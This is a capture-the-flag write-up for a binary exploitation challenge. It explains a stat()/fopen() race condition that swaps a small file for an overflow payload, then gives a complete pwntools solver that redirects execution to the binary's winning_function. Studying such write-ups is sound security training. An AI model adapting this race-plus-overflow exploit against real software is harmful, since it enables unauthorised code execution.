[[Pwn]]


## Race condition binary exploitation

- This binary accepts a file path and reads it content up to 4096 bytes then passed it to buffer variable with 80 bytes size. This is indeed buffer overflow, but there's a check for the file size that should not more than 80 bytes. We can bypass it with race condition.
- We passed a dummy file with small size, then immediately replace the content with our exploit payload to bypass the file size check. This is applicable because after check the file using `stat()` the same file path is used for `fopen()` after passing all the check condition.
- There's a `winning_function()` inside this binary. We use ret2win technique to exploit this binary.


## Solver
```python
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
	if args.GDB: # Set GDBscript below
		return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
	elif args.REMOTE: # ('server', 'port')
		return remote(sys.argv[1], sys.argv[2], *a, **kw)
	else: # Run locally
		return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)

gdbscript = '''
init-pwndbg
cyclic 120
continue
'''.format(**locals())

# Binary filename
exe = './nahmnahmnahm'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
# EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
offset = 104
# Start program
io = start()

open("/tmp/ghost", 'w').write("Gh0sted")
io.sendlineafter(": ", b"/tmp/ghost")

# Build the payload
payload = flat({
	offset: [
	elf.sym['winning_function']
]})

# Send the payload
open("/tmp/ghost", "wb").write(payload)
io.sendlineafter(":\n", b"")
io.interactive()
```
